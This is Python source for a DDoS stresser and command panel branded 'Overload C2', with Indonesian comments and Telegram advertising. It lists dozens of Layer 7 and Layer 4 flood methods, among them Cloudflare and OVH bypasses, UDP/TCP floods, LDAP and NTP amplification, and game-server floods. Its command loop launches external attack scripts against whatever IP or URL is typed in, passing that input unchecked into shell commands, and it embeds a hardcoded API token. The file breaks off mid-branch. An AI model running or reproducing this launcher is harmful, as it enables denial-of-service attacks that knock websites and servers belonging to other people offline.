import socket
import builtins
import os
import requests
import random
import getpass
import time
import sys
import math
import subprocess
import threading
import json
import urllib.parse
import string
import datetime
import pytz
from termcolor import colored
from rich import print
from rich.table import Table
from tabulate import tabulate
from colorama import init, Fore, Back, Style  
    
proxys = open('proxies.txt').readlines()
bots = len(proxys)

def clear_screen():
    os.system('cls'if os.name == 'nt'else'clear')

init() 
                           
def get_ip_info(token, ip=None):
    ip_url = f"https://ipinfo.io/{ip}?token={token}"
    response = requests.get(ip_url)

    if response.ok:
        data = response.json()
        simple_data = {
            "ASN": data.get("asn"),
            "Organisasi": data.get("org"),
            "ISP": data.get("isp"),
            "IP": data.get("ip")
        }
        print("[bold yellow]Informasi IP[/bold yellow]")
        table = Table(show_header=True, header_style="bold magenta")
        table.add_column("Detail")
        table.add_column("Informasi")
        for key, value in simple_data.items():
            if value:
                table.add_row(key, value)
        print(table)
        return data
    else:
        print(f"[bold red]Error saat mengambil info IP untuk {ip}:[/bold red] {response.text}")
        return None

def get_url_info(url, token):
    parsed_url = urllib.parse.urlparse(url)
    hostname = parsed_url.netloc
    api_endpoint = f"https://host.io/api/web/{hostname}?token={token}"
    response_hostio = requests.get(api_endpoint)

    if response_hostio.status_code == 200:
        data_hostio = response_hostio.json()
        ip_address = data_hostio.get("ip") # Asumsi ada kunci 'ip'

        if ip_address:
            ip_url_ipinfo = f"https://ipinfo.io/{ip_address}?token={token}"
            response_ipinfo = requests.get(ip_url_ipinfo)
            if response_ipinfo.ok:
                data_ipinfo = response_ipinfo.json()
                simple_data = {
                    "ASN": data_ipinfo.get("asn"),
                    "Organisasi": data_ipinfo.get("org"),
                    "ISP": data_ipinfo.get("isp"),
                    "IP": data_ipinfo.get("ip")
                }
                print(f"[bold yellow]Informasi URL untuk {url}[/bold yellow]")
                table = Table(show_header=True, header_style="bold magenta")
                table.add_column("Detail")
                table.add_column("Informasi")
                for key, value in simple_data.items():
                    if value:
                        table.add_row(key, value)
                print(table)
                return simple_data
            else:
                print(f"[bold red]Error saat mengambil info IP untuk {ip_address}:[/bold red] {response_ipinfo.text}")
                return None
        else:
            print(f"[yellow]Tidak dapat menemukan alamat IP untuk {url}.[/yellow]")
            return None
    else:
        print(f"[bold red]Error saat mengambil informasi URL untuk {url}:[/bold red] {response_hostio.text}")
        return None
                                                                                                                                                                                                                                                                                   
def si(): 
    print('         [ https://t.me/+VP7cK9_P7jE4ZjBl ] | Welcome to Stresser Panel | Owner: @OverloadServer | Update v5.0')
    print("")                

def layer7():
    clear_screen()
    si() # Memanggil fungsi si()
    print("--------------------------------------------------")
    print("                LAYER 7 METHODS                   ")
    print("--------------------------------------------------")
    print("➤ httpbypass    : Metode bypass HTTP umum untuk WAF/CDN (misalnya Cloudflare/Captcha)")
    print("➤ cfgas         : Cloudflare GAS (Serangan banjir HTTP/S tingkat tinggi dengan logika bypass)")
    print("➤ http-storm    : Metode banjir HTTP volume tinggi")
    print("➤ tls           : Serangan Banjir TLS Handshake (menguras sumber daya TLS server)")
    print("➤ cf-bypass     : Metode bypass Cloudflare generik")
    print("➤ uambypass     : Bypass untuk 'Under Attack Mode' Cloudflare")
    print("➤ cf-flood     : Metode ini menyerang target dengan memanfaatkan celah keamanan di Cloudflare untuk meningkatkan dampak serangan")
    print("➤ httpget       : Serangan banjir permintaan HTTP GET standar")
    print("➤ auto          : Pemilihan metode serangan otomatis berdasarkan analisis target")
    print("➤ crash         : Upaya untuk merusak server target (misalnya, melalui permintaan yang salah format)")
    print("➤ httpflood     : Banjir HTTP dasar (tingkat tinggi, berbagai jenis permintaan)")
    print("➤ httpssl     : Serangan yang menargetkan komunikasi terenkripsi menggunakan protokol HTTPS/SSL")
    print("➤ h2-hold     : Serangan lebih lama untuk target yang dilindungi Cloudflare")
    print("➤ h2-bypass        : Teknik bypass Cloudflare yang lebih canggih")
    print("➤ hyper         : Serangan dengan laju permintaan yang sangat tinggi")
    print("➤ slow          : Serangan mirip Slowloris (mempertahankan koneksi lambat untuk menguras sumber daya server)")
    print("➤ https-spoof   : Mencoba memalsukan permintaan HTTPS agar terlihat sah atau melewati filter")
    print("➤ http-requests : Metode umum untuk mengirim berbagai jenis permintaan HTTP")
    print("--------------------------------------------------")

# Catatan: Pastikan fungsi `clear_screen()` dan `si()` sudah terdefinisi di bagian lain kode Anda.

def layer4():
    clear_screen()
    si() # Memanggil fungsi si()
    print("--------------------------------------------------")
    print("                LAYER 4 METHODS                   ")
    print("--------------------------------------------------")
    print("➤ udp          : Banjir paket UDP dasar")
    print("➤ tcp          : Banjir paket TCP (SYN, ACK, dll.)")
    print("➤ nfo-killer   : Banjir khusus yang menargetkan server game (seringkali NFOservers)")
    print("➤ std          : Banjir generik standar (umum untuk Layer 4)")
    print("➤ udpbypass    : Upaya untuk melewati perlindungan banjir UDP")
    print("➤ destroy      : Banjir intens yang bertujuan membanjiri dan merusak layanan")
    print("➤ home         : Banjir generik untuk beban umum")
    print("➤ god          : Metode banjir yang sangat kuat atau serbaguna")
    print("➤ slowloris    : Serangan Slowloris (mempertahankan koneksi lambat untuk menguras sumber daya server - *Catatan: Ini adalah metode Layer 7*)")
    print("➤ flux         : Banjir yang terkait dengan serangan DNS (mis. DNS Flux/Subdomain acak)")
    print("➤ stdv2        : Banjir standar versi 2 (versi yang diperbarui)")
    print("➤ ovh-raw      : Banjir paket mentah yang menargetkan server yang dilindungi OVH")
    print("➤ ovh-beam     : Teknik banjir spesifik untuk perlindungan OVH")
    print("➤ overflow     : Banjir yang mencoba menyebabkan *buffer overflow* atau kehabisan sumber daya")
    print("➤ ovh-amp      : Serangan amplifikasi yang menargetkan OVH")
    print("➤ minecraft    : Banjir khusus yang menargetkan server Minecraft")
    print("➤ samp         : Banjir khusus yang menargetkan server San Andreas Multiplayer (SA-MP)")
    print("➤ ldap         : Banjir Amplifikasi LDAP")
    print("--------------------------------------------------")

# Catatan: Pastikan fungsi `clear_screen()` dan `si()` sudah terdefinisi di bagian lain kode Anda.

def usage():
    clear_screen()
    si() # Memanggil fungsi si()
    print("--------------------------------------------------")
    print("        USAGE METODE LAYER 7 & LAYER 4         ")
    print("--------------------------------------------------")

    print("\n--- METODE LAYER 7 ---")
    print("➤ httpbypass    : httpbypass https://target.com 60")
    print("➤ cfgas         : cfgas https://target.com 60")
    print("➤ http-storm    : http-storm https://target.com 60")
    print("➤ tls           : tls https://target.com 60")
    print("➤ cf-bypass     : cf-bypass https://target.com 60")
    print("➤ uambypass     : uambypass https://target.com 60")
    print("➤ cf-flood       : cf-flood https://target.com 60")
    print("➤ httpget       : httpget https://target.com 60")
    print("➤ auto          : auto https://target.com 60")
    print("➤ crash         : crash https://target.com GET")
    print("➤ httpflood     : httpflood https://target.com 15000 get 60")
    print("➤ httpssl        : httpssl https://target.com port 60")
    print("➤ h2-hold       : h2-hold https://target.com 60")
    print("➤ h2-bypass    : h2-bypass https://target.com 60")
    print("➤ hyper         : hyper https://target.com 60")
    print("➤ slow          : slow https://target.com 60")
    print("➤ https-spoof   : https-spoof https://target.com 60")
    print("➤ http-requests : http-requests https://target.com 60")

    print("\n--- METODE LAYER 4 ---")
    print("➤ udp          : udp 1.1.1.1 port")
    print("➤ tcp          : tcp GET/POST/HEAD 1.1.1.1 port 60 8500")
    print("➤ nfo-killer   : nfo-killer 1.1.1.1 port 850 60")
    print("➤ std          : std 1.1.1.1 port")
    print("➤ udpbypass    : udpbypass 1.1.1.1 port")
    print("➤ destroy      : destroy 1.1.1.1 port 60")
    print("➤ home         : home 1.1.1.1 port 65500 60")
    print("➤ god          : god 1.1.1.1 port 60")
    print("➤ slowloris    : slowloris 1.1.1.1 port")
    print("➤ flux         : flux 1.1.1.1 port 250")
    print("➤ stdv2        : stdv2 1.1.1.1 port")
    print("➤ ovh-raw      : ovh-raw GET 1.1.1.1 port 60 8500")
    print("➤ ovh-beam     : ovh-beam GET 1.1.1.1 port 60")
    print("➤ overflow     : overflow 1.1.1.1 port 5000")
    print("➤ ovh-amp      : ovh-amp 1.1.1.1 port")
    print("➤ minecraft    : minecraft 1.1.1.1 5000 500 60")
    print("➤ samp         : samp 1.1.1.1 7777")
    print("➤ ldap         : ldap 1.1.1.1 port 650 60")
    print("--------------------------------------------------")

# Catatan: Pastikan fungsi `clear_screen()` dan `si()` sudah terdefinisi di bagian lain kode Anda.

# Fungsi getproxy sudah didefinisikan dengan benar di tingkat global
import os 
# Pastikan 'os' diimpor jika fungsi ini berada di file yang berbeda
# Asumsikan clear_screen() dan si() sudah didefinisikan di tempat lain

def getproxy():
    # Asumsi: clear_screen() dan si() adalah fungsi yang sudah didefinisikan
    clear_screen()
    si() 
    
    print("Starting proxy collection process...")
    
    # 1. Jalankan skrip getproxy.py (Mengambil proxy)
    # Skrip getproxy.py akan mengambil proxy dan menyimpannya ke proxies.txt
    os.system('python3 getproxy.py')
    
    # Pesan untuk menunjukkan transisi ke tahap selanjutnya
    print("\n--- Proxy collection successful. Starting validation process (cekproxy.py)... ---")
    
    os.system('python3 cekproxy.py')
    
    print("\nProxy validation complete.")
    print("Proxy save succesfull. Please check from proxies.txt")

def clear_screen():
    # Fungsi untuk membersihkan layar
    # Tetap gunakan os.system, namun jika ini juga bermasalah,
    # Anda harus menonaktifkannya dan hanya mencetak baris kosong.
    os.system('cls' if os.name == 'nt' else 'clear')

# Variabel yang dibutuhkan
bots = 1234 
box_content_width = 66
# -----------------------------------------------

def menu():
    clear_screen()
    
    # MENGHAPUS: Baris ini (title bar) dihapus karena sering bermasalah di terminal dasar.
    # sys.stdout.write(f"\x1b]2;Overload Server --> Online siswa: [{bots}] | paket siswa | VIP (true)\x07")
    
    # Pesan informasi awal (Teks polos)
    header_text = ' [ https://t.me/+VP7cK9_P7jE4ZjBl ] | Welcome to Stresser Panel | Owner: @OverloadServer | Update v5.0 '
    print(header_text)
    print("")

    # Seni ASCII (Logo) - HANYA Teks Polos
    # Karakter double line (██) tetap dipertahankan selama terminal Anda mendukungnya.
    ansi_art_lines = """  
                                     .                                                      .
        .n                   .                 .                  n.
  .   .dP                  dP                   9b                 9b.    .
 4    qXb         .       dX                     Xb       .        dXp     t
dX.    9Xb      .dXb    __                         __    dXb.     dXP     .Xb
9XXb._       _.dXXXXb dXXXXbo.                 .odXXXXb dXXXXb._       _.dXXP
 9XXXXXXXXXXXXXXXXXXXVXXXXXXXXOo.           .oOXXXXXXXXVXXXXXXXXXXXXXXXXXXXP
  `9XXXXXXXXXXXXXXXXXXXXX'~   ~`OOO8b   d8OOO'~   ~`XXXXXXXXXXXXXXXXXXXXXP'
    `9XXXXXXXXXXXP' `9XX'   "t.me/OverloadServer"   `XXP' `9XXXXXXXXXXXP'
        ~~~~~~~       9X.          .db|db.          .XP       ~~~~~~~
                        )b.  .dbo.dP'`v'`9b.odb.  .dX(
                      ,dXXXXXXXXXXXb     dXXXXXXXXXXXb.
                     dXXXXXXXXXXXP'   .   `9XXXXXXXXXXXb
                    dXXXXXXXXXXXXb   d|b   dXXXXXXXXXXXXb
                    9XXb'   `XXXXXb.dX|Xb.dXXXXX'   `dXXP
                     `'      9XXXXXX(   )XXXXXXP      `'
                              XXXX X.`v'.X XXXX
                              XP^X'`b   d'`X^XX
                              X. 9  `   '  P )X
                              `b  `       '  d'
                               `             '
                            O V E R L O A D   C 2
"""
    
    print(ansi_art_lines)
    print("")

    # --- Fungsi Bantuan Banner (Menggunakan Karakter ASCII Dasar) ---
    
    # Fungsi bantu untuk menggambar garis border atas 
    def draw_top_border(width):
        # Mengganti ╔, ═, ╗ menjadi +, -, +
        return f"+{'-' * width}+"

    # Fungsi bantu untuk menggambar garis border bawah 
    def draw_bottom_border(width):
        # Mengganti ╚, ═, ╝ menjadi +, -, +
        return f"+{'-' * width}+"

    # Fungsi bantu untuk baris tengah
    def draw_middle_line(text, width, align='center', **kwargs):
        if align == 'center':
            padded_text = text.center(width)
        elif align == 'left':
            padded_text = text.ljust(width)
            
        # Mengganti ║ menjadi |
        return f"|{padded_text}|"

    # --- Banner Selamat Datang ---
    print(draw_top_border(box_content_width)) 
    print(draw_middle_line("WELCOME TO OVERLOAD CONTROL PANEL", box_content_width, 'center')) 
    print(draw_middle_line(" - - - Copyright 2024-2027 - - - ", box_content_width, 'center')) 
    print(draw_bottom_border(box_content_width))

    print("") 

    # --- Banner Telegram ---
    print(draw_top_border(box_content_width))
    print(draw_middle_line(">>> https://t.me/+VP7cK9_P7jE4ZjBl <<<", box_content_width, 'center')) 
    print(draw_bottom_border(box_content_width))

    print("") 

    # --- Banner Menu Utama ---
    print(draw_top_border(box_content_width))
    print(draw_middle_line("LAYER7  ➤ SHOW LAYER7 FOR ATTACK DOMAIN", box_content_width, 'left')) 
    print(draw_middle_line("LAYER4  ➤ SHOW LAYER4 FOR ATTACK IP", box_content_width, 'left')) 
    print(draw_middle_line("USAGE   ➤ SHOW EXAMPLE USAGE PANEL", box_content_width, 'left'))
    print(draw_middle_line("GETPROXY ➤ UPDATE PROXY", box_content_width, 'left'))
    print(draw_middle_line("CLEAR   ➤ CLEAR TERMINAL", box_content_width, 'left')) 
    print(draw_bottom_border(box_content_width))

def main():
    menu() # Memanggil fungsi menu untuk menampilkan tampilan awal
    while(True):        
        # Prompt untuk input pengguna
        print('\033[ROOT\033] \033►\033[KOMINFO] ', end='')
        cnc = input().strip() # Menggunakan .strip() untuk menghapus spasi di awal/akhir
        print("Anda memasukkan:", cnc)
        
        # Normalisasi input ke huruf kecil untuk perbandingan yang lebih mudah dan case-insensitive
        command_lower = cnc.lower()

        if command_lower in ["layer7", "l7"]: # Kondisi disederhanakan
            layer7()
        elif command_lower in ["layer4", "l4"]: # Kondisi disederhanakan
            layer4()
        elif command_lower in ["clear", "cls"]: # Kondisi disederhanakan
            clear_screen() # Panggil clear_screen() untuk membersihkan terminal
            menu() # Tampilkan kembali menu setelah membersihkan layar
        elif command_lower == "usage": # Kondisi disederhanakan, hapus redundansi
            usage() 
        elif command_lower == "getproxy": # Kondisi disederhanakan, hapus redundansi
            getproxy() # Panggilan ke fungsi getproxy() yang didefinisikan di atas
    
# LAYER 4 METHODS   

        elif "udpbypass" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                os.system(f'./UDPBYPASS {ip} {port}')
                token = "727e8c2fa5b07c"
                ip = f"{ip}"
                info = get_ip_info(token, ip)
                print(info)    
            except Exception as e:
                print(f"Error executing command: {e}")
            except IndexError:
                print('Usage: udpbypass <ip> <port>')
                print('Example: udpbypass 1.1.1.1 80')

        elif "stdv2" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                os.system(f'./std {ip} {port}')
                token = "727e8c2fa5b07c"
                ip = f"{ip}"
                info = get_ip_info(token, ip)
                print(info)
            except Exception as e:
                print(f"Error executing command: {e}")
            except IndexError:
                print('Usage: stdv2 <ip> <port>')
                print('Example: stdv2 1.1.1.1 80')

        elif "flux" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                thread = cnc.split()[3]
                os.system(f'./flux {ip} {port} 250 0')
                token = "727e8c2fa5b07c"
                ip = f"{ip}"
                info = get_ip_info(token, ip)
                print(info)
            except Exception as e:
                print(f"Error executing command: {e}")
            except IndexError:
                print('Usage: flux <ip> <port> <threads>')
                print('Example: flux 1.1.1.1 80 250')

        elif "slowloris" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                os.system(f'./slowloris {ip} {port}')
                token = "727e8c2fa5b07c"
                ip = f"{ip}"
                info = get_ip_info(token, ip)
                print(info)
            except Exception as e:
                print(f"Error executing command: {e}")
            except IndexError:
                print('Usage: slowloris <ip> <port>')
                print('Example: slowloris 1.1.1.1 80')

        elif "god" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                time = cnc.split()[3]
                os.system(f'perl god.pl {ip} {port} 65500 {time}')
                token = "727e8c2fa5b07c"
                ip = f"{ip}"
                info = get_ip_info(token, ip)
                print(info)
            except Exception as e:
                print(f"Error executing command: {e}")
            except IndexError:
                print('Usage: god <ip> <port> <time>')
                print('Example: god 1.1.1.1 80 60')

        elif "destroy" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                time = cnc.split()[3]
                os.system(f'perl destroy.pl {ip} {port} 65500 {time}')
                token = "727e8c2fa5b07c"
                ip = f"{ip}"
                info = get_ip_info(token, ip)
                print(info)
            except Exception as e:
                print(f"Error executing command: {e}")
            except IndexError:
                print('Usage: destroy <ip> <port> <time>')
                print('Example: destroy 1.1.1.1 80 60')

        elif "std" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                os.system(f'./STD-NOSPOOF {ip} {port}')
                token = "727e8c2fa5b07c"
                ip = f"{ip}"
                info = get_ip_info(token, ip)
                print(info)
            except Exception as e:
                print(f"Error executing command: {e}")
            except IndexError:
                print('Usage: std <ip> <port>')
                print('Example: std 1.1.1.1 80')

        elif "home" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                psize = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'perl home.pl {ip} {port} 65500 {time}')
                token = "727e8c2fa5b07c"
                ip = f"{ip}"
                info = get_ip_info(token, ip)
                print(info)
            except Exception as e:
                print(f"Error executing command: {e}")
            except IndexError:
                print('Usage: home <ip> <port> <packet_size> <time>')
                print('Example: home 1.1.1.1 80 65500 60')

        elif "udp" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                os.system(f'python2 udp.py {ip} {port} 0 0')
                token = "727e8c2fa5b07c"
                ip = f"{ip}"
                info = get_ip_info(token, ip)
                print(info)
            except Exception as e:
                print(f"Error executing command: {e}")
            except IndexError:
                print('Usage: udp <ip> <port>')
                print('Example: udp 1.1.1.1 80')

        elif "nfo-killer" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                threads = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'./nfo-killer {ip} {port} 850 -1 {time}')
                token = "727e8c2fa5b07c"
                ip = f"{ip}"
                info = get_ip_info(token, ip)
                print(info)
            except Exception as e:
                print(f"Error executing command: {e}")
            except IndexError:
                print('Usage: nfo-killer <ip> <port> <threads> <time>')
                print('Example: nfo-killer 1.1.1.1 80 850 60')

        elif "ovh-raw" in cnc:
            try:
                method = cnc.split()[1]
                ip = cnc.split()[2]
                port = cnc.split()[3]
                time = cnc.split()[4]
                conns = cnc.split()[5]
                os.system(f'./ovh-raw {method} {ip} {port} {time} 8500')
                token = "727e8c2fa5b07c"
                ip = f"{ip}"
                info = get_ip_info(token, ip)
                print(info)
            except Exception as e:
                print(f"Error executing command: {e}")
            except IndexError:
                print('Usage: ovh-raw METHODS[GET/POST/HEAD] <ip> <port> <time> <connections>')
                print('Example: ovh-raw GET 1.1.1.1 80 60 8500')

        elif "tcp" in cnc:
            try:
                method = cnc.split()[1]
                ip = cnc.split()[2]
                port = cnc.split()[3]
                time = cnc.split()[4]
                conns = cnc.split()[5]
                os.system(f'./100UP-TCP {method} {ip} {port} {time} 8500')
                token = "727e8c2fa5b07c"
                ip = f"{ip}"
                info = get_ip_info(token, ip)
                print(info)
            except Exception as e:
                print(f"Error executing command: {e}")
            except IndexError:
                print('Usage: tcp METHODS[GET/POST/HEAD] <ip> <port> <time> <connections>')
                print('Example: tcp GET 1.1.1.1 80 60 8500')
                
        elif "ovh-beam" in cnc:
            try:
                method = cnc.split()[1]
                ip = cnc.split()[2]
                port = cnc.split()[3]
                time = cnc.split()[4] 
                os.system(f'./OVH-BEAM {method} {ip} {port} {time} 1024')
                token = "727e8c2fa5b07c"
                ip = f"{ip}"
                info = get_ip_info(token, ip)
                print(info)
            except Exception as e:
                print(f"Error executing command: {e}")
            except IndexError:
                print('Usage: ovh-beam <GET/HEAD/POST/PUT> <ip> <port> <time>')
                print('Example: ovh-beam GET 51.38.92.223 80 60')
                
        elif "overflow" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                thread = cnc.split()[3]
                os.system(f'./OVERFLOW {ip} {port} {thread}')
                token = "727e8c2fa5b07c"
                ip = f"{ip}"
                info = get_ip_info(token, ip)
                print(info)
            except Exception as e:
                print(f"Error executing command: {e}")
            except IndexError:
                print('Usage: overflow <ip> <port> <threads>')
                print('Example: overflow 1.1.1.1 80 5000')
               
        elif "samp" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                os.system(f'python2 samp.py {ip} {port}')
                token = "727e8c2fa5b07c"
                ip = f"{ip}"
                info = get_ip_info(token, ip)
                print(info)
            except Exception as e:
                print(f"Error executing command: {e}")
            except IndexError:
                print('Usage: samp <ip> <port>')
                print('Example: samp 1.1.1.1 7777')

        elif "ldap" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                thread = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'./ldap {ip} {port} 650 -1 {time}')
                token = "727e8c2fa5b07c"
                ip = f"{ip}"
                info = get_ip_info(token, ip)
                print(info)
            except Exception as e:
                print(f"Error executing command: {e}")
            except IndexError:
                print('Usage: ldap <ip> <port> <threads> <time>')
                print('Example: ldap 1.1.1.1 80 650 60')

        elif "minecraft" in cnc:
            try:
                ip = cnc.split()[1]
                throttle = cnc.split()[2]
                threads = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'./MINECRAFT-SLAM {ip} 5000 500 {time}')
                token = "727e8c2fa5b07c"
                ip = f"{ip}"
                info = get_ip_info(token, ip)
                print(info)
            except Exception as e:
                print(f"Error executing command: {e}")
            except IndexError:
                print('Usage: minecraft <ip> <throttle> <threads> <time>')
                print('Example: minecraft 1.1.1.1 5000 500 60')

        elif "ovh-amp" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                os.system(f'./OVH-AMP {ip} {port}')
                token = "727e8c2fa5b07c"
                ip = f"{ip}"
                info = get_ip_info(token, ip)
                print(info)
            except Exception as e:
                print(f"Error executing command: {e}")
            except IndexError:
                print('Usage: ovh-amp <ip> <port>')
                print('Example: ovh-amp 1.1.1.1 80')
                
        elif "ntp" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                throttle = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'./ntp {ip} {port} ntp.txt 250 {time}')
                token = "727e8c2fa5b07c"
                ip = f"{ip}"
                info = get_ip_info(token, ip)
                print(info)
            except Exception as e:
                print(f"Error executing command: {e}")
            except IndexError:
                print('Usage: ntp <ip> <port> <throttle> <time>')
                print('Example: ntp 1.1.1.1 22 250 60')     
                
# LAYER 7 METHODS
    
        elif "https-spoof" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                thread = cnc.split()[3]
                os.system(f'python3 https-spoof.py {url} {time} 3')
                url = f"{url}"
                token = "727e8c2fa5b07c"
                result = get_url_info(url, token)
                print(result) 
            except IndexError:
                print('Usage: https-spoof <url> <time> <threads>')
                print('Example: https-spoof http://vailon.com 60 500')     
                
        elif "httpssl" in cnc:
            try:
                url = cnc.split()[1]
                port = cnc.split()[2]
                time = cnc.split()[3]               
                os.system(f'go run stress.go {url} {port} 3 1 {time} 3')
                url = f"{url}"
                token = "727e8c2fa5b07c"
                result = get_url_info(url, token)
                print(result) 
            except IndexError:
                print('Usage: httpssl <url> <port> <time>')
                print('Example: httpssl https://lol.com 443 60')                             
        
        elif "slow" in cnc:
            try:
               url, time = cnc.split()[1:3]
               os.system("clear")  # Bersihkan layar (opsional)
               
               os.system(f'node slow.js {url} {time}')          
               
               url = f"{url}"
               token = "727e8c2fa5b07c"
               result = get_url_info(url, token)
               print(result)             
                
               sys.stdout.write(f"\x1b]2; https://t.me/+VP7cK9_P7jE4ZjBl\x07")
               sys.stdout.flush()
               
               print(f"""
               [Sistem] Informasi
               Target: {url}
               Waktu: {time}s
               Metode: slow
               Ketik [CLS] untuk membersihkan terminal""")
                          
            except IndexError:
                print('Penggunaan: slow <url> <waktu>')
                print('Contoh: slow http://example.com 60')
            except ValueError as ve:
                print(f"Waktu tidak valid: {ve}")
            except Exception as e:
                print(f"Terjadi kesalahan saat menjalankan perintah: {e}")
    
        elif "hyper" in cnc:
            try:
               url, time = cnc.split()[1:3]
               os.system("clear")  # Bersihkan layar (opsional)
               
               os.system(f'node hyper.js {url} {time}')
                
               url = f"{url}"
               token = "727e8c2fa5b07c"          
               result = get_url_info(url, token)
               print(result) 
                
               sys.stdout.write(f"\x1b]2; https://t.me/+VP7cK9_P7jE4ZjBl\x07")
               sys.stdout.flush()
               
               print(f"""
               [Sistem] Informasi
               Target: {url}
               Waktu: {time}s
               Metode: hyper
               Ketik [CLS] untuk membersihkan terminal""") 
                         
            except IndexError:
                print('Penggunaan: hyper <url> <waktu>')
                print('Contoh: hyper http://example.com 60')
            except ValueError as ve:
                print(f"Waktu tidak valid: {ve}")
            except Exception as e:
                print(f"Terjadi kesalahan saat menjalankan perintah: {e}")
                
        elif "cf-flood" in cnc:
            try:
               url, time = cnc.split()[1:3]
               os.system("clear")  # Bersihkan layar (opsional)
               
               os.system(f'node cf-flood.js {url} {time} 1 3 proxies.txt')          
               
               url = f"{url}"
               token = "727e8c2fa5b07c"
               result = get_url_info(url, token)
               print(result)             
                
               sys.stdout.write(f"\x1b]2; https://t.me/+VP7cK9_P7jE4ZjBl\x07")
               sys.stdout.flush()
               
               print(f"""
               [Sistem] Informasi
               Target: {url}
               Waktu: {time}s
               Metode: cf-flood
               Ketik [CLS] untuk membersihkan terminal""")
                          
            except IndexError:
                print('Penggunaan: cf-flood <url> <waktu>')
                print('Contoh: cf-flood http://example.com 60')
            except ValueError as ve:
                print(f"Waktu tidak valid: {ve}")
            except Exception as e:
                print(f"Terjadi kesalahan saat menjalankan perintah: {e}")        
                
        elif "h2-hold" in cnc:
            try:
               url, time = cnc.split()[1:3]
               os.system("clear")  # Bersihkan layar (opsional)
               
               os.system(f'node h2-holdv1.js {url} {time} 1 3 proxies.txt')     
               os.system(f'node h2-holdv2.js {url} {time} 1 3 proxies.txt')     
               
               url = f"{url}"
               token = "727e8c2fa5b07c"
               result = get_url_info(url, token)
               print(result)             
                
               sys.stdout.write(f"\x1b]2; https://t.me/+VP7cK9_P7jE4ZjBl\x07")
               sys.stdout.flush()
               
               print(f"""
               [Sistem] Informasi
               Target: {url}
               Waktu: {time}s
               Metode: h2-hold
               Ketik [CLS] untuk membersihkan terminal""")
                          
            except IndexError:
                print('Penggunaan: h2-hold <url> <waktu>')
                print('Contoh: h2-hold http://example.com 60')
            except ValueError as ve:
                print(f"Waktu tidak valid: {ve}")
            except Exception as e:
                print(f"Terjadi kesalahan saat menjalankan perintah: {e}")
    
        elif "h2-bypass" in cnc:
            try:
               url, time = cnc.split()[1:3]
               os.system("clear")  # Bersihkan layar (opsional)
               
               os.system(f'node h2-bypass.js GET {url} {time} 1 3 proxies.txt --bfm true --ratelimit true --randpath true --randrate true --debug true --cdn true --full')          
               
               url = f"{url}"
               token = "727e8c2fa5b07c"
               result = get_url_info(url, token)
               print(result)             
                
               sys.stdout.write(f"\x1b]2; https://t.me/+VP7cK9_P7jE4ZjBl\x07")
               sys.stdout.flush()
               
               print(f"""
               [Sistem] Informasi
               Target: {url}
               Waktu: {time}s
               Metode: h2-bypass
               Ketik [CLS] untuk membersihkan terminal""")
                          
            except IndexError:
                print('Penggunaan: h2-bypass <url> <waktu>')
                print('Contoh: h2-bypass http://example.com 60')
            except ValueError as ve:
                print(f"Waktu tidak valid: {ve}")
            except Exception as e:
                print(f"Terjadi kesalahan saat menjalankan perintah: {e}")
        
        elif "cfgas" in cnc:
            try:
               url, time = cnc.split()[1:3]
               os.system("clear")  # Bersihkan layar (opsional)
                             
               os.system(f'node cfgas.js {url} {time} 1 3 proxies.txt')
               
               url = f"{url}"
               token = "727e8c2fa5b07c"
               result = get_url_info(url, token)
               print(result) 
                
               sys.stdout.write(f"\x1b]2; https://t.me/+VP7cK9_P7jE4ZjBl\x07")
               sys.stdout.flush()
               
               print(f"""
               [Sistem] Informasi
               Target: {url}
               Waktu: {time}s
               Metode: cfgas
               Ketik [CLS] untuk membersihkan terminal""") 
                         
            except IndexError:
                print('Penggunaan: cfgas <url> <waktu>')
                print('Contoh: cfgas http://example.com 60')
            except ValueError as ve:
                print(f"Waktu tidak valid: {ve}")
            except Exception as e:
                print(f"Terjadi kesalahan saat menjalankan perintah: {e}")

        elif "httpbypass" in cnc:
            try:
               url, time = cnc.split()[1:3]
               os.system("clear")  # Bersihkan layar (opsional)
                
               os.system(f'node httpbypass {url} {time} 1 3 proxies.txt')
               os.system(f'node httpbypassv2 {url} {time} 1 3 proxies.txt')
                
               url = f"{url}"
               token = "727e8c2fa5b07c"
               result = get_url_info(url, token)
               print(result) 
                
               sys.stdout.write(f"\x1b]2; https://t.me/+VP7cK9_P7jE4ZjBl\x07")
               sys.stdout.flush()
               
               print(f"""
               [Sistem] Informasi
               Target: {url}
               Waktu: {time}s
               Metode: httpbypass
               Ketik [CLS] untuk membersihkan terminal""")  
                        
            except IndexError:
                print('Penggunaan: httpbypass <url> <waktu>')
                print('Contoh: httpbypass http://example.com 60')
            except ValueError as ve:
                print(f"Waktu tidak valid: {ve}")
            except Exception as e:
                print(f"Terjadi kesalahan saat menjalankan perintah: {e}") 

        elif "http-requests" in cnc:
            try:
               url, time = cnc.split()[1:3]
               os.system("clear")  # Bersihkan layar (opsional)
               
               os.system(f'node http-requests.js {url} {time}')
               
               url = f"{url}"
               token = "727e8c2fa5b07c"
               result = get_url_info(url, token)
               print(result) 
                
               sys.stdout.write(f"\x1b]2; https://t.me/+VP7cK9_P7jE4ZjBl\x07")
               sys.stdout.flush()
               
               print(f"""
               [Sistem] Informasi
               Target: {url}
               Waktu: {time}s
               Metode: http-requests
